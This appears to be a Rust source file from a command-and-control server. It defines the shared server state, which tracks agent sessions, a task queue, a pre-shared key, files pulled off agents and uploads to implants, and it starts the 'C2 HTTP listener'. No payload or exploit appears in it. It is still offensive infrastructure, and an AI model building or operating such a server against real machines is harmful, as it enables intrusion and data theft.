use std::sync::Arc;

use crate::filestore::FileStore;
use crate::queue::SharedQueue;
use crate::session::SharedRegistry;
use crate::uploadstore::UploadStore;

/// Shared server state handed to axum handlers.
#[derive(Clone)]
pub struct ServerState {
    pub registry: SharedRegistry,
    pub queue: SharedQueue,
    pub psk: Arc<Vec<u8>>,
    /// On-disk store for files pulled off agents.
    pub files: FileStore,
    /// Registry of server->implant uploads in flight.
    pub uploads: UploadStore,
}

/// Bind the C2 HTTP listener and serve until shutdown.
pub async fn serve(state: ServerState, bind: &str) -> anyhow::Result<()> {
    let app = crate::channels::application(state);
    let listener = tokio::net::TcpListener::bind(bind).await?;
    tracing::info!(bind, "c2 listener up");
    axum::serve(listener, app).await?;
    Ok(())
}
